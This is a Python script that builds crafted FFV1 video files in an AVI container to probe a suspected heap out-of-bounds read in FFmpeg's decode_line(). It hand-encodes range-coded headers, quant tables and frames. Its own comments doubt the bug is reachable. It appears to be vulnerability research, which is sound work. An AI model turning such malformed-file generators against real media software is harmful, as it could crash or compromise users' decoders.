#!/usr/bin/env python3
"""
vuln_001_gen.py
Generate a crafted FFV1 file attempting to trigger OOB in decode_line()
(p->state[context] heap OOB via quant-table context_count mismatch).

VULN-001: decode_line() uses av_assert2(context < p->context_count)
which is a no-op in release builds. If context >= p->context_count, OOB occurs.

Analysis:
  - context_count = 1 requires all 5 quant tables to return ret=1.
  - ret=1 means the entire table is mapped to v=0 (all zeros).
  - With all-zero quant tables, get_context() always returns 0.
  - Therefore context < context_count=1 is always satisfied: no OOB through this path.

Strategy:
  - Generate a valid FFV1 v3 file to exercise the code path.
  - Also try a file where quant tables have context_count=2 but narrow entries
    to see if context can exceed context_count.
  - If no crash: report UNVERIFIED with analysis.
"""

import struct
import os


# ---- CRC-32 (av_crc with AV_CRC_32_IEEE, init=0) ------------------------
# FFmpeg's AV_CRC_32_IEEE uses polynomial 0x04C11DB7 (non-reflected / BE),
# but av_crc_init stores av_bswap32 of each table entry so that the generic
# LE iteration `crc = ctx[(crc & 0xFF) ^ byte] ^ (crc >> 8)` works for both
# reflected and non-reflected polynomials.
# Crucially, this is NOT the same as AV_CRC_32_IEEE_LE (0xEDB88320).

import struct as _struct

def _make_av_crc_32_ieee_table():
    poly = 0x04C11DB7
    t = []
    for i in range(256):
        c = i << 24
        for _ in range(8):
            if c & 0x80000000:
                c = ((c << 1) & 0xFFFFFFFF) ^ poly
            else:
                c = (c << 1) & 0xFFFFFFFF
        # av_bswap32
        t.append(_struct.unpack('<I', _struct.pack('>I', c))[0])
    return t

_CRC32_TABLE = _make_av_crc_32_ieee_table()

def crc32_init0(data):
    """Matches av_crc(av_crc_get_table(AV_CRC_32_IEEE), 0, data, len)."""
    crc = 0
    for b in data:
        crc = _CRC32_TABLE[(crc & 0xFF) ^ b] ^ (crc >> 8)
    return crc & 0xFFFFFFFF


# ---- FFV1 Range Coder state tables (ff_build_rac_states(0.05*(1<<32), 248)) ----

def _build_rac_states(factor, max_p):
    ONE = 1 << 32
    one_state = [0] * 256
    zero_state = [0] * 256
    last_p8 = 0
    p = ONE // 2
    for _ in range(128):
        p8 = (256 * p + ONE // 2) >> 32
        if p8 <= last_p8:
            p8 = last_p8 + 1
        if last_p8 and last_p8 < 256 and p8 <= max_p:
            one_state[last_p8] = p8
        p += ((ONE - p) * factor + ONE // 2) >> 32
        last_p8 = p8
    for i in range(256 - max_p, max_p + 1):
        if one_state[i]:
            continue
        p = (i * ONE + 128) >> 8
        p += ((ONE - p) * factor + ONE // 2) >> 32
        p8 = (256 * p + ONE // 2) >> 32
        if p8 <= i:
            p8 = i + 1
        if p8 > max_p:
            p8 = max_p
        one_state[i] = p8
    for i in range(1, 255):
        zero_state[i] = 256 - one_state[256 - i]
    return one_state, zero_state

_ONE_ST, _ZERO_ST = _build_rac_states(int(0.05 * (1 << 32)), 248)


# ---- Range Coder Encoder ------------------------------------------------

class RAC:
    """FFV1 range coder encoder (matches rangecoder.c/h)."""

    def __init__(self):
        self.low = 0
        self.range = 0xFF00
        self.ob = -1          # outstanding_byte
        self.oc = 0           # outstanding_count
        self.buf = bytearray()

    def _renorm(self):
        # Condition: (unsigned)(low - 0xFF01) >= 0xFF
        if ((self.low - 0xFF01) & 0xFFFFFFFF) >= 0xFF:
            carry = (self.low >= 0x10000)
            if self.ob >= 0:
                self.buf.append((self.ob + (1 if carry else 0)) & 0xFF)
            self.buf.extend([0x00 if carry else 0xFF] * self.oc)
            self.oc = 0
            self.ob = (self.low >> 8) & 0xFF
        else:
            self.oc += 1
        self.low = (self.low & 0xFF) << 8
        self.range <<= 8

    def put(self, state_arr, idx, bit):
        """Encode one bit using state at state_arr[idx]."""
        s = state_arr[idx]
        r1 = (self.range * s) >> 8
        if not bit:
            self.range -= r1
            state_arr[idx] = _ZERO_ST[s]
        else:
            self.low += self.range - r1
            self.range = r1
            state_arr[idx] = _ONE_ST[s]
        if self.range < 0x100:
            self._renorm()

    def sym(self, state_arr, base, v, signed_flag):
        """Encode integer v (put_symbol_inline)."""
        if v != 0:
            a = abs(v)
            e = a.bit_length() - 1
            self.put(state_arr, base, 0)       # not zero
            if e <= 9:
                for i in range(e):
                    self.put(state_arr, base + 1 + i, 1)
                self.put(state_arr, base + 1 + e, 0)
                for i in range(e - 1, -1, -1):
                    self.put(state_arr, base + 22 + i, (a >> i) & 1)
                if signed_flag:
                    self.put(state_arr, base + 11 + e, int(v < 0))
            else:
                for i in range(e):
                    self.put(state_arr, base + 1 + min(i, 9), 1)
                self.put(state_arr, base + 10, 0)
                for i in range(e - 1, -1, -1):
                    self.put(state_arr, base + 22 + min(i, 9), (a >> i) & 1)
                if signed_flag:
                    self.put(state_arr, base + 21, int(v < 0))
        else:
            self.put(state_arr, base, 1)       # zero

    def flush(self):
        """Terminate and return encoded bytes (ff_rac_terminate version=0).

        Matches ff_rac_terminate(c, 0) in rangecoder.c:
          c->range = 0xFF; c->low += 0xFF; renorm_encoder(c);
          c->range = 0xFF; renorm_encoder(c);
          return c->bytestream - c->bytestream_start;

        After the two renorm calls, the final outstanding_byte is set but NOT
        written to bytestream (ob stays pending).  The C encoder's return value
        counts only bytes written to bytestream, so we must NOT append ob here.
        The decoder reads any over-run bytes as 0x00 padding (AV_INPUT_BUFFER_PADDING_SIZE).
        """
        self.range = 0xFF
        self.low += 0xFF
        self._renorm()
        self.range = 0xFF
        self._renorm()
        # Do NOT append self.ob — it is the pending byte that would need one more
        # renorm to commit; the decoder reads it as 0x00 from allocation padding.
        return bytes(self.buf)

    def flush_v1(self):
        """Terminate with the version=1 extra bit (ff_rac_terminate version=1)."""
        st = bytearray([129])
        self.put(st, 0, 0)
        return self.flush()

    def _check_assert(self):
        """Debug: verify terminate assertions (low==0, range>=0x100)."""
        return self.low, self.range


# ---- Quant table helpers -------------------------------------------------

def write_qt_all_zero(enc):
    """
    Write a quant table where all 128 half-entries are 0 (ret=1).
    Encoder writes a single put_symbol(127) with fresh state.
    Decoder: len = 127+1 = 128, fills positions 0..127 with 0.
    Loop exits with v=1, ret = 2*1-1 = 1.
    context_count contribution: *1 (unchanged).
    get_context() contribution from this dimension: always 0.
    """
    st = bytearray([128] * 32)
    enc.sym(st, 0, 127, False)


def write_qt_half_split(enc):
    """
    Write a quant table where positions 0..63 -> 0, 64..127 -> scale.
    Produces ret = 3 (v exits at 2, ret = 2*2-1 = 3).
    context_count contribution: *3.

    write_quant_table() encodes:
      For i=1..127: if quant_table[i] != quant_table[i-1]: emit gap
      After loop: emit final gap
    With split at i=64:
      - Gap before change: i=64, last=0, emit (64-0-1=63)
      - Final: i=128, last=64, emit (128-64-1=63)
    So we write symbols: 63, 63.
    """
    st = bytearray([128] * 32)
    enc.sym(st, 0, 63, False)   # first run: 64 positions at v=0
    enc.sym(st, 0, 63, False)   # second run: 64 positions at v=1


# ---- FFV1 extradata builder (version 3) ----------------------------------

def make_extradata_v3(quant_table_count=1, use_split_for_set1=False):
    """
    Build FFV1 version 3 extradata.
    quant_table_count=1: one table set, all-zero (context_count=1).
    quant_table_count=2: two sets; set0 all-zero (cc=1), set1 uses first
      sub-table as half-split (cc for set1 = (3*1*1*1*1+1)/2 = 2).
    """
    enc = RAC()
    st = bytearray([128] * 32)

    enc.sym(st, 0, 3, False)   # version = 3
    enc.sym(st, 0, 4, False)   # micro_version = 4
    enc.sym(st, 0, 1, False)   # ac = 1 (AC_RANGE_DEFAULT_TAB)
    # no custom state transitions
    enc.sym(st, 0, 0, False)   # colorspace = 0 (YUV/gray)
    enc.sym(st, 0, 8, False)   # bits_per_raw_sample = 8
    enc.put(st, 0, 0)          # chroma_planes = 0 (grayscale)
    enc.sym(st, 0, 0, False)   # chroma_h_shift = 0
    enc.sym(st, 0, 0, False)   # chroma_v_shift = 0
    enc.put(st, 0, 0)          # transparency = 0
    # colorspace != 2 so no bayer_order
    enc.sym(st, 0, 0, False)   # num_h_slices - 1 = 0 (1 slice)
    enc.sym(st, 0, 0, False)   # num_v_slices - 1 = 0 (1 slice)

    enc.sym(st, 0, quant_table_count, False)

    # The decoder reads ALL quant table sets first (ff_ffv1_read_quant_tables loop),
    # then reads ALL initial_states flags.  Do NOT interleave them.

    # Table set 0: 5 sub-tables, all-zero -> context_count[0] = 1
    for _ in range(5):
        write_qt_all_zero(enc)

    if quant_table_count == 2:
        # Table set 1: first sub-table half-split (ret=3), rest all-zero
        # -> context_count[1] = (3*1*1*1*1+1)/2 = 2
        write_qt_half_split(enc)
        for _ in range(4):
            write_qt_all_zero(enc)

    # Now write initial_states flags for ALL sets (after all tables).
    for _ in range(quant_table_count):
        enc.put(st, 0, 0)   # initial_states flag = 0

    enc.sym(st, 0, 0, False)   # ec = 0
    enc.sym(st, 0, 1, False)   # intra = 1

    raw = enc.flush()
    # RIFF chunks must be even-sized; AVI demuxer reads a pad byte for odd-sized
    # extradata (line 817-818 in avidec.c), eating the first byte of the next
    # chunk and misaligning the parser.  Pad the body to even length before CRC.
    if len(raw) % 2 == 1:
        raw = raw + b'\x00'
    crc = crc32_init0(raw)
    return raw + struct.pack('<I', crc)


# ---- FFV1 frame builder (version 3) --------------------------------------

def make_frame_v3(width, height, quant_table_index=0, pad_bytes=1):
    """
    Build a minimal FFV1 version 3 key frame for a grayscale 4x4 image.

    Packet layout:
      [key_frame bit (range coded)] [slice_header (range coded)] [pixel data]
      [terminator bit] [flush bytes] [3-byte BE size]

    The decoder:
     - decode_header: reads key_frame bit, for v3 counts slices by size field.
     - decode_slices: slice0 uses sc->c = c (header range coder),
       bytestream_end = buf + AV_RB24(end-3) + 3.
     - decode_slice: init_slice_state (context_count=0 -> 0-byte alloc),
       decode_slice_header (reads sx/sy/sw/sh/idx/ps/sar, sets context_count),
       init_slice_state again (reallocates if needed),
       decode_plane -> decode_line -> get_symbol_inline(p->state[context]).
    """
    enc = RAC()

    # --- Frame header: key_frame bit ----------------------------------------
    kfst = bytearray([128])
    enc.put(kfst, 0, 1)      # key_frame = 1

    # --- Slice header (read by decode_slice_header in v3) -------------------
    sh_st = bytearray([128] * 32)
    # sx, sy: slice position indices
    enc.sym(sh_st, 0, 0, False)   # sx = 0
    enc.sym(sh_st, 0, 0, False)   # sy = 0
    # sw-1, sh-1: slice span (sw=1, sh=1 means full frame)
    enc.sym(sh_st, 0, 0, False)   # sw - 1 = 0
    enc.sym(sh_st, 0, 0, False)   # sh - 1 = 0
    # For EACH of f->plane_count planes: quant_table_index.
    # f->plane_count = 1 + (chroma_planes || version<4) + transparency + bayer
    # For grayscale v3 (chroma_planes=0, transparency=0, bayer=0, version=3<4):
    #   plane_count = 1 + 1 + 0 + 0 = 2.
    # Both planes use the same quant_table_index.
    enc.sym(sh_st, 0, quant_table_index, False)   # plane 0
    enc.sym(sh_st, 0, quant_table_index, False)   # plane 1 (v3 always has 2 planes)
    # ps = 0 (progressive scan)
    enc.sym(sh_st, 0, 0, False)
    # sar.num = 0 (unspecified), sar.den = 1 (av_image_check_sar: !num -> 0 = valid)
    enc.sym(sh_st, 0, 0, False)
    enc.sym(sh_st, 0, 1, False)
    # version 3 (not > 3): no slice_reset_contexts or slice_coding_mode

    # --- Pixel data ---------------------------------------------------------
    # decode_plane -> decode_line for each row.
    # With all-zero quant tables, context is always 0.
    # get_symbol_inline reads from p->state[0] (initialized to 128 by clear_slice).
    # State[0]=128 means 50% probability.
    # We encode diff=0 for every pixel: put_rac(state+0, 1) = "is zero, return 0".
    px_st = bytearray([128] * 32)
    for _ in range(width * height):
        enc.put(px_st, 0, 1)    # diff = 0 (first bit of get_symbol_inline = 1 -> return 0)

    # --- Terminator (version > 2, ac != AC_GOLOMB_RICE) --------------------
    # decode_slice expects: get_rac(&sc->c, (uint8_t[]{129})) then checks alignment
    term_st = bytearray([129])
    enc.put(term_st, 0, 0)   # terminator bit

    # --- Flush range coder --------------------------------------------------
    slice_bytes = enc.flush()

    # --- Alignment padding (optional) ----------------------------------------
    # After decoding all pixels + terminator get_rac, ffv1dec.c checks:
    #   v = sc->c.bytestream_end - sc->c.bytestream - 2 - 5*!!f->ec
    # For ec=0 this must equal 0.  The number of null padding bytes needed
    # depends on the exact range-coder refill count after the terminator bit.
    # pad_bytes=0 works for the current slice configuration (3 planes x all symbols
    # produce exactly the right bytestream alignment).
    if pad_bytes > 0:
        slice_bytes = slice_bytes + b'\x00' * pad_bytes

    # --- 3-byte size field --------------------------------------------------
    # find_next_slice: v = AV_RB24(buf_end - 3) + 3
    # For slice 0: pos=buf, len=v
    # sc->c.bytestream_end = buf + len = buf + AV_RB24(end-3) + 3
    # size_field = len(slice_bytes) (including the padding byte above)
    size_field = len(slice_bytes)
    # AV_WB24: 3 bytes big-endian
    size_bytes = bytes([(size_field >> 16) & 0xFF,
                        (size_field >> 8) & 0xFF,
                        size_field & 0xFF])

    return slice_bytes + size_bytes


# ---- AVI container -------------------------------------------------------

def make_avi(width, height, extradata, frame_data):
    """Build a minimal AVI file with one FFV1 frame."""

    def chunk(fcc, data):
        return fcc.encode('ascii') + struct.pack('<I', len(data)) + data

    def lst(tp, data):
        return b'LIST' + struct.pack('<I', 4 + len(data)) + tp.encode('ascii') + data

    # BITMAPINFOHEADER + extradata
    # biSize = 40 (standard).  AVI demuxer sets extradata = strf[40:strf_size].
    # biBitCount must be > 8 to prevent the AVI demuxer from running palette-
    # extraction code that would modify (or misinterpret) the extradata bytes.
    # System ffmpeg uses 24 for FFV1 gray8.
    bitmapinfo = struct.pack('<IiiHHIIiiII',
        40,                   # biSize = 40 (standard BITMAPINFOHEADER only)
        width,                # biWidth
        height,               # biHeight
        1,                    # biPlanes
        24,                   # biBitCount = 24 (> 8 prevents palette extraction)
        0x31564646,           # biCompression = 'FFV1' (LE: 46 46 56 31)
        0, 0, 0, 0, 0         # biSizeImage, biX/YPelsPerMeter, biClr{Used,Important}
    ) + extradata

    # Stream header (strh for video) = 56 bytes
    # AVISTREAMHEADER: fccType(4s) fccHandler(4s) dwFlags(I) wPriority(H) wLanguage(H)
    # dwInitialFrames(I) dwScale(I) dwRate(I) dwStart(I) dwLength(I)
    # dwSuggestedBufferSize(I) dwQuality(I) dwSampleSize(I) rcFrame(h h h h)
    strh = struct.pack('<4s4sIHH8Ihhhh',
        b'vids',    # fccType
        b'FFV1',    # fccHandler
        0,          # dwFlags
        0,          # wPriority
        0,          # wLanguage
        0,          # dwInitialFrames
        1,          # dwScale
        1,          # dwRate
        0,          # dwStart
        1,          # dwLength
        0,          # dwSuggestedBufferSize
        0xFFFFFFFF, # dwQuality
        0,          # dwSampleSize
        0, 0, width, height  # rcFrame left top right bottom
    )

    strl = lst('strl', chunk('strh', strh) + chunk('strf', bitmapinfo))

    # AVI main header (avih)
    avih = struct.pack('<IIIIIIIIIIIIII',
        1000000,              # dwMicroSecPerFrame (1 fps)
        len(frame_data),      # dwMaxBytesPerSec
        0,                    # dwPaddingGranularity
        0x10,                 # dwFlags
        1,                    # dwTotalFrames
        0,                    # dwInitialFrames
        1,                    # dwStreams
        len(frame_data),      # dwSuggestedBufferSize
        width,                # dwWidth
        height,               # dwHeight
        0, 0, 0, 0            # reserved
    )

    hdrl = lst('hdrl', chunk('avih', avih) + strl)
    movi = lst('movi', chunk('00dc', frame_data))

    avi_body = hdrl + movi
    return b'RIFF' + struct.pack('<I', 4 + len(avi_body)) + b'AVI ' + avi_body


# ---- Main ----------------------------------------------------------------

def main():
    outdir = os.path.dirname(os.path.abspath(__file__))
    W, H = 4, 4

    # --- File 1: context_count=1 (all-zero quant tables) ------------------
    out1 = os.path.join(outdir, 'vuln_001_input.avi')
    extra1 = make_extradata_v3(quant_table_count=1)
    frame1 = make_frame_v3(W, H, quant_table_index=0, pad_bytes=0)
    avi1 = make_avi(W, H, extra1, frame1)
    with open(out1, 'wb') as f:
        f.write(avi1)
    print(f"[+] {out1} ({len(avi1)} bytes) — context_count=1, quant_tables all-zero")

    # --- File 2: two quant table sets, slice uses set 1 (context_count=2) -
    # This tests: does decode_line stay within p->state bounds?
    # With set 1 (half-split first subtable), get_context can return 0 or 1.
    # context_count=2, p->state has 2*32=64 bytes. p->state[0] and p->state[1] valid.
    out2 = os.path.join(outdir, 'vuln_001_input2.avi')
    extra2 = make_extradata_v3(quant_table_count=2)
    frame2 = make_frame_v3(W, H, quant_table_index=1, pad_bytes=0)
    avi2 = make_avi(W, H, extra2, frame2)
    with open(out2, 'wb') as f:
        f.write(avi2)
    print(f"[+] {out2} ({len(avi2)} bytes) — context_count=2, half-split quant table")

    print("\nExtradata hex dump:")
    print(f"  set1: {extra1.hex()}")
    print(f"  set2: {extra2.hex()}")


if __name__ == '__main__':
    main()
